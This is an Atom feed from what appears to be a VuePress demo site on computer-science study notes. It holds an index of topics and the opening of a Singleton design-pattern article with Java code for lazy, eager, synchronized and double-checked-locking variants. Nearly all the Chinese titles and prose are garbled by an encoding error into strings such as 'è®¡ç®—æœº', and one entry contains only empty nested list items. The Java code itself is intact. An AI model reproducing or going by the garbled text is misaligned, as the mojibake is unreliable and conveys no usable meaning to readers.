<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
  <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/</id>
  <title>CS Way</title>
  <subtitle>CS Way</subtitle>
  <updated>2022-05-16T12:00:29.059Z</updated>
  <generator>vuepress-plugin-feed2</generator>
  <link rel="self" href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/atom.xml"/>
  <link rel="alternate" href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/"/>
  <category term="è®¡ç®—æœº"/>
  <entry>
    <title type="html">å¹»ç¯ç‰‡é¡µ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/slide.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/slide.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<i>Content not supported</i>]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">è®¡ç®—æœºNote</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="" tabindex="-1"> </h1>
<h1 id="âœï¸-ç®—æ³•" tabindex="-1"> âœï¸ ç®—æ³•</h1>
<ul>
<li><a href="/notes/%E7%AE%97%E6%B3%95/%E5%89%91%E6%8C%87Offer%E9%A2%98%E8%A7%A3-%E7%9B%AE%E5%BD%95.html">å‰‘æŒ‡ Offer é¢˜è§£</a></li>
<li><a href="/notes/%E7%AE%97%E6%B3%95/Leetcode%E9%A2%98%E8%A7%A3-%E7%9B%AE%E5%BD%95.html">Leetcode é¢˜è§£</a></li>
<li><a href="/notes/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E7%9B%AE%E5%BD%95.html">ç®—æ³•</a></li>
<li><a href="https://xiaozhuanlan.com/CyC2018" target="_blank" rel="noopener noreferrer">åç«¯é¢è¯•è¿›é˜¶æŒ‡å—</a></li>
</ul>
<h1 id="ğŸ’»-æ“ä½œç³»ç»Ÿ" tabindex="-1"> ğŸ’» æ“ä½œç³»ç»Ÿ</h1>
<ul>
<li><a href="/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%9B%AE%E5%BD%95.html">è®¡ç®—æœºæ“ä½œç³»ç»Ÿ</a></li>
<li><a href="/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux.html">Linux</a></li>
</ul>
<h1 id="â˜ï¸-ç½‘ç»œ" tabindex="-1"> â˜ï¸ ç½‘ç»œ</h1>
<ul>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%9B%AE%E5%BD%95.html">è®¡ç®—æœºç½‘ç»œ</a></li>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/HTTP.html">HTTP</a></li>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/Socket.html">Socket</a></li>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/Netty.html">Netty</a></li>
</ul>
<h1 id="ğŸ¨-é¢å‘å¯¹è±¡" tabindex="-1"> ğŸ¨ é¢å‘å¯¹è±¡</h1>
<ul>
<li><a href="/notes/OOP/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html">é¢å‘å¯¹è±¡æ€æƒ³</a></li>
<li><a href="/notes/OOP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%9B%AE%E5%BD%95.html">è®¾è®¡æ¨¡å¼</a></li>
</ul>
<h1 id="ğŸ’¾-æ•°æ®åº“" tabindex="-1"> ğŸ’¾ æ•°æ®åº“</h1>
<ul>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html">æ•°æ®åº“ç³»ç»ŸåŸç†</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL.html">SQL</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Leetcode-Database%E9%A2%98%E8%A7%A3.html">Leetcode-Database é¢˜è§£</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL.html">MySQL</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html">Redis</a></li>
</ul>
<h1 id="â˜•ï¸-java" tabindex="-1"> â˜•ï¸ Java</h1>
<ul>
<li><a href="/notes/Java/Java%E5%9F%BA%E7%A1%80.html">Java åŸºç¡€</a></li>
<li><a href="/notes/Java/Java%E9%AB%98%E7%BA%A7.html">Java é«˜çº§</a></li>
<li><a href="/notes/Java/Java%E5%AE%B9%E5%99%A8.html">Java å®¹å™¨</a></li>
<li><a href="/notes/Java/Java%E5%B9%B6%E5%8F%91%E5%9F%BA%E7%A1%80.html">Java å¹¶å‘åŸºç¡€</a></li>
<li><a href="/notes/Java/Java%E5%B9%B6%E5%8F%91%E8%BF%9B%E9%98%B6.html">Java å¹¶å‘è¿›é˜¶</a></li>
<li><a href="/notes/Java/Java%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html">Java è™šæ‹Ÿæœº-å†…å­˜ç®¡ç†</a></li>
<li><a href="/notes/Java/Java%E8%99%9A%E6%8B%9F%E6%9C%BA-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F.html">Java è™šæ‹Ÿæœº-æ‰§è¡Œç³»ç»Ÿ</a></li>
<li><a href="/notes/Java/JavaIO.html">Java I/O</a></li>
<li><a href="/notes/Java/JavaEE.html">Java EE</a></li>
<li><a href="/notes/Java/Java%E7%89%B9%E6%80%A7.html">Java ç‰¹æ€§</a></li>
</ul>
<h1 id="ğŸ’¡-ç³»ç»Ÿè®¾è®¡" tabindex="-1"> ğŸ’¡ ç³»ç»Ÿè®¾è®¡</h1>
<ul>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html">ç³»ç»Ÿè®¾è®¡åŸºç¡€</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%88%86%E5%B8%83%E5%BC%8F.html">åˆ†å¸ƒå¼</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%9B%86%E7%BE%A4.html">é›†ç¾¤</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html">æ”»å‡»æŠ€æœ¯</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%BC%93%E5%AD%98.html">ç¼“å­˜</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html">æ¶ˆæ¯é˜Ÿåˆ—</a></li>
</ul>
<h1 id="ğŸ”§-åˆ†å¸ƒå¼ä¸­é—´ä»¶" tabindex="-1"> ğŸ”§ åˆ†å¸ƒå¼ä¸­é—´ä»¶</h1>
<ul>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6.html">åˆ†å¸ƒå¼ä¸­é—´ä»¶</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF.html">åˆ†å¸ƒå¼æ¶ˆæ¯</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1.html">åˆ†å¸ƒå¼æœåŠ¡</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98.html">åˆ†å¸ƒå¼ç¼“å­˜</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html">åˆ†å¸ƒå¼äº‹åŠ¡</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.html">åˆ†å¸ƒå¼æ•°æ®åº“</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E5%BA%A6.html">åˆ†å¸ƒå¼è°ƒåº¦</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97.html">åˆ†å¸ƒå¼è®¡ç®—</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83.html">é…ç½®ä¸­å¿ƒ</a></li>
</ul>
<h1 id="ğŸ”¨-å¸¸ç”¨æ¡†æ¶å’Œè½¯ä»¶" tabindex="-1"> ğŸ”¨ å¸¸ç”¨æ¡†æ¶å’Œè½¯ä»¶</h1>
<ul>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Spring.html">Spring</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Spring-MVC.html">Spring MVC</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/SpringBoot.html">SpringBoot</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/PandoraBoot.html">PandoraBoot</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Dubbo.html">Dubbo</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Zookeeper.html">Zookeeper</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/RabbitMQ.html">RabbitMQ</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/RocketMQ.html">RocketMQ</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Kafka.html">Kafka</a></li>
</ul>
<h1 id="ğŸ“ˆ-å‰ç«¯" tabindex="-1"> ğŸ“ˆ å‰ç«¯</h1>
<ul>
<li><a href="/notes/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80.html">å‰ç«¯åŸºç¡€</a></li>
<li><a href="/notes/%E5%89%8D%E7%AB%AF/JavaScript.html">JavaScript</a></li>
<li><a href="/notes/%E5%89%8D%E7%AB%AF/JS-%E8%BF%9B%E9%98%B6.html">JS è¿›é˜¶</a></li>
</ul>
<h1 id="ğŸ”§-å·¥å…·" tabindex="-1"> ğŸ”§ å·¥å…·</h1>
<ul>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/Git.html">Git</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/Docker.html">Docker</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">æ­£åˆ™è¡¨è¾¾å¼</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html">æ„å»ºå·¥å…·</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/IDEA.html">IDEA</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/VSCode.html">VSCode</a></li>
</ul>
]]></content>
    <category term="è®¡ç®—æœº"/>
    <published>2020-12-27T00:00:00.000Z</published>
  </entry>
  <entry>
    <title type="html">Java</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/Java/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/Java/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">é¢å‘å¯¹è±¡ç¼–ç¨‹</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€æ¦‚è¿°</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€æ¦‚è¿°" tabindex="-1"> ä¸€ã€æ¦‚è¿°</h1>
<p>è®¾è®¡æ¨¡å¼æ˜¯è§£å†³é—®é¢˜çš„æ–¹æ¡ˆï¼Œå­¦ä¹ ç°æœ‰çš„è®¾è®¡æ¨¡å¼å¯ä»¥åšåˆ°ç»éªŒå¤ç”¨ã€‚</p>
<p>æ‹¥æœ‰è®¾è®¡æ¨¡å¼è¯æ±‡ï¼Œåœ¨æ²Ÿé€šæ—¶å°±èƒ½ç”¨æ›´å°‘çš„è¯æ±‡æ¥è®¨è®ºï¼Œå¹¶ä¸”ä¸éœ€è¦äº†è§£åº•å±‚ç»†èŠ‚ã€‚</p>
<h1 id="äºŒã€åˆ›å»ºå‹" tabindex="-1"> äºŒã€åˆ›å»ºå‹</h1>
<h2 id="_1-å•ä¾‹-singleton" tabindex="-1"> 1. å•ä¾‹ï¼ˆSingletonï¼‰</h2>
<h3 id="intent" tabindex="-1"> Intent</h3>
<p>ç¡®ä¿ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›è¯¥å®ä¾‹çš„å…¨å±€è®¿é—®ç‚¹ã€‚</p>
<h3 id="class-diagram" tabindex="-1"> Class Diagram</h3>
<p>ä½¿ç”¨ä¸€ä¸ªç§æœ‰æ„é€ å‡½æ•°ã€ä¸€ä¸ªç§æœ‰é™æ€å˜é‡ä»¥åŠä¸€ä¸ªå…¬æœ‰é™æ€å‡½æ•°æ¥å®ç°ã€‚</p>
<p>ç§æœ‰æ„é€ å‡½æ•°ä¿è¯äº†ä¸èƒ½é€šè¿‡æ„é€ å‡½æ•°æ¥åˆ›å»ºå¯¹è±¡å®ä¾‹ï¼Œåªèƒ½é€šè¿‡å…¬æœ‰é™æ€å‡½æ•°è¿”å›å”¯ä¸€çš„ç§æœ‰é™æ€å˜é‡ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/eca1f422-8381-409b-ad04-98ef39ae38ba.png"/> </div><br>
<h3 id="implementation" tabindex="-1"> Implementation</h3>
<h4 id="i-æ‡’æ±‰å¼-çº¿ç¨‹ä¸å®‰å…¨" tabindex="-1"> â…  æ‡’æ±‰å¼-çº¿ç¨‹ä¸å®‰å…¨</h4>
<p>ä»¥ä¸‹å®ç°ä¸­ï¼Œç§æœ‰é™æ€å˜é‡ uniqueInstance è¢«å»¶è¿Ÿå®ä¾‹åŒ–ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰ç”¨åˆ°è¯¥ç±»ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå®ä¾‹åŒ– uniqueInstanceï¼Œä»è€ŒèŠ‚çº¦èµ„æºã€‚</p>
<p>è¿™ä¸ªå®ç°åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹æ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹èƒ½å¤ŸåŒæ—¶è¿›å…¥ <code>if (uniqueInstance == null)</code> ï¼Œå¹¶ä¸”æ­¤æ—¶ uniqueInstance ä¸º nullï¼Œé‚£ä¹ˆä¼šæœ‰å¤šä¸ªçº¿ç¨‹æ‰§è¡Œ <code>uniqueInstance = new Singleton();</code> è¯­å¥ï¼Œè¿™å°†å¯¼è‡´å®ä¾‹åŒ–å¤šæ¬¡ uniqueInstanceã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>Singleton</span> <span>{</span>

    <span>private</span> <span>static</span> <span>Singleton</span> uniqueInstance<span>;</span>

    <span>private</span> <span>Singleton</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
            uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> uniqueInstance<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h4 id="ii-é¥¿æ±‰å¼-çº¿ç¨‹å®‰å…¨" tabindex="-1"> â…¡ é¥¿æ±‰å¼-çº¿ç¨‹å®‰å…¨</h4>
<p>çº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯ç”±äº uniqueInstance è¢«å®ä¾‹åŒ–å¤šæ¬¡ï¼Œé‡‡å–ç›´æ¥å®ä¾‹åŒ– uniqueInstance çš„æ–¹å¼å°±ä¸ä¼šäº§ç”Ÿçº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ç›´æ¥å®ä¾‹åŒ–çš„æ–¹å¼ä¹Ÿä¸¢å¤±äº†å»¶è¿Ÿå®ä¾‹åŒ–å¸¦æ¥çš„èŠ‚çº¦èµ„æºçš„å¥½å¤„ã€‚</p>
<div><pre><code><span>private</span> <span>static</span> <span>Singleton</span> uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><h4 id="iii-æ‡’æ±‰å¼-çº¿ç¨‹å®‰å…¨" tabindex="-1"> â…¢ æ‡’æ±‰å¼-çº¿ç¨‹å®‰å…¨</h4>
<p>åªéœ€è¦å¯¹ getUniqueInstance() æ–¹æ³•åŠ é”ï¼Œé‚£ä¹ˆåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¤Ÿè¿›å…¥è¯¥æ–¹æ³•ï¼Œä»è€Œé¿å…äº†å®ä¾‹åŒ–å¤šæ¬¡ uniqueInstanceã€‚</p>
<p>ä½†æ˜¯å½“ä¸€ä¸ªçº¿ç¨‹è¿›å…¥è¯¥æ–¹æ³•ä¹‹åï¼Œå…¶å®ƒè¯•å›¾è¿›å…¥è¯¥æ–¹æ³•çš„çº¿ç¨‹éƒ½å¿…é¡»ç­‰å¾…ï¼Œå³ä½¿ uniqueInstance å·²ç»è¢«å®ä¾‹åŒ–äº†ã€‚è¿™ä¼šè®©çº¿ç¨‹é˜»å¡æ—¶é—´è¿‡é•¿ï¼Œå› æ­¤è¯¥æ–¹æ³•æœ‰æ€§èƒ½é—®é¢˜ï¼Œä¸æ¨èä½¿ç”¨ã€‚</p>
<div><pre><code><span>public</span> <span>static</span> <span>synchronized</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
        uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> uniqueInstance<span>;</span>
<span>}</span>
</code></pre></div><h4 id="iv-åŒé‡æ ¡éªŒé”-çº¿ç¨‹å®‰å…¨" tabindex="-1"> â…£ åŒé‡æ ¡éªŒé”-çº¿ç¨‹å®‰å…¨</h4>
<p>uniqueInstance åªéœ€è¦è¢«å®ä¾‹åŒ–ä¸€æ¬¡ï¼Œä¹‹åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚åŠ é”æ“ä½œåªéœ€è¦å¯¹å®ä¾‹åŒ–é‚£éƒ¨åˆ†çš„ä»£ç è¿›è¡Œï¼Œåªæœ‰å½“ uniqueInstance æ²¡æœ‰è¢«å®ä¾‹åŒ–æ—¶ï¼Œæ‰éœ€è¦è¿›è¡ŒåŠ é”ã€‚</p>
<p>åŒé‡æ ¡éªŒé”å…ˆåˆ¤æ–­ uniqueInstance æ˜¯å¦å·²ç»è¢«å®ä¾‹åŒ–ï¼Œå¦‚æœæ²¡æœ‰è¢«å®ä¾‹åŒ–ï¼Œé‚£ä¹ˆæ‰å¯¹å®ä¾‹åŒ–è¯­å¥è¿›è¡ŒåŠ é”ã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>Singleton</span> <span>{</span>

    <span>private</span> <span>volatile</span> <span>static</span> <span>Singleton</span> uniqueInstance<span>;</span>

    <span>private</span> <span>Singleton</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
            <span>synchronized</span> <span>(</span><span>Singleton</span><span>.</span><span>class</span><span>)</span> <span>{</span>
                <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
                    uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
                <span>}</span>
            <span>}</span>
        <span>}</span>
        <span>return</span> uniqueInstance<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><p>è€ƒè™‘ä¸‹é¢çš„å®ç°ï¼Œä¹Ÿå°±æ˜¯åªä½¿ç”¨äº†ä¸€ä¸ª if è¯­å¥ã€‚åœ¨ uniqueInstance == null çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸¤ä¸ªçº¿ç¨‹éƒ½æ‰§è¡Œäº† if è¯­å¥ï¼Œé‚£ä¹ˆä¸¤ä¸ªçº¿ç¨‹éƒ½ä¼šè¿›å…¥ if è¯­å¥å—å†…ã€‚è™½ç„¶åœ¨ if è¯­å¥å—å†…æœ‰åŠ é”æ“ä½œï¼Œä½†æ˜¯ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¼šæ‰§è¡Œ <code>uniqueInstance = new Singleton();</code> è¿™æ¡è¯­å¥ï¼Œåªæ˜¯å…ˆåçš„é—®é¢˜ï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œä¸¤æ¬¡å®ä¾‹åŒ–ã€‚å› æ­¤å¿…é¡»ä½¿ç”¨åŒé‡æ ¡éªŒé”ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ä½¿ç”¨ä¸¤ä¸ª if è¯­å¥ï¼šç¬¬ä¸€ä¸ª if è¯­å¥ç”¨æ¥é¿å… uniqueInstance å·²ç»è¢«å®ä¾‹åŒ–ä¹‹åçš„åŠ é”æ“ä½œï¼Œè€Œç¬¬äºŒä¸ª if è¯­å¥è¿›è¡Œäº†åŠ é”ï¼Œæ‰€ä»¥åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è¿›å…¥ï¼Œå°±ä¸ä¼šå‡ºç° uniqueInstance == null æ—¶ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è¿›è¡Œå®ä¾‹åŒ–æ“ä½œã€‚</p>
<div><pre><code><span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
    <span>synchronized</span> <span>(</span><span>Singleton</span><span>.</span><span>class</span><span>)</span> <span>{</span>
        uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><p>uniqueInstance é‡‡ç”¨ volatile å…³é”®å­—ä¿®é¥°ä¹Ÿæ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œ <code>uniqueInstance = new Singleton();</code> è¿™æ®µä»£ç å…¶å®æ˜¯åˆ†ä¸ºä¸‰æ­¥æ‰§è¡Œï¼š</p>
<ol>
<li>ä¸º uniqueInstance åˆ†é…å†…å­˜ç©ºé—´</li>
<li>åˆå§‹åŒ– uniqueInstance</li>
<li>å°† uniqueInstance æŒ‡å‘åˆ†é…çš„å†…å­˜åœ°å€</li>
</ol>
<p>ä½†æ˜¯ç”±äº JVM å…·æœ‰æŒ‡ä»¤é‡æ’çš„ç‰¹æ€§ï¼Œæ‰§è¡Œé¡ºåºæœ‰å¯èƒ½å˜æˆ 1&gt;3&gt;2ã€‚æŒ‡ä»¤é‡æ’åœ¨å•çº¿ç¨‹ç¯å¢ƒä¸‹ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œä½†æ˜¯åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¼šå¯¼è‡´ä¸€ä¸ªçº¿ç¨‹è·å¾—è¿˜æ²¡æœ‰åˆå§‹åŒ–çš„å®ä¾‹ã€‚ä¾‹å¦‚ï¼Œçº¿ç¨‹ T<sub>1</sub> æ‰§è¡Œäº† 1 å’Œ 3ï¼Œæ­¤æ—¶ T<sub>2</sub> è°ƒç”¨ getUniqueInstance() åå‘ç° uniqueInstance ä¸ä¸ºç©ºï¼Œå› æ­¤è¿”å› uniqueInstanceï¼Œä½†æ­¤æ—¶ uniqueInstance è¿˜æœªè¢«åˆå§‹åŒ–ã€‚</p>
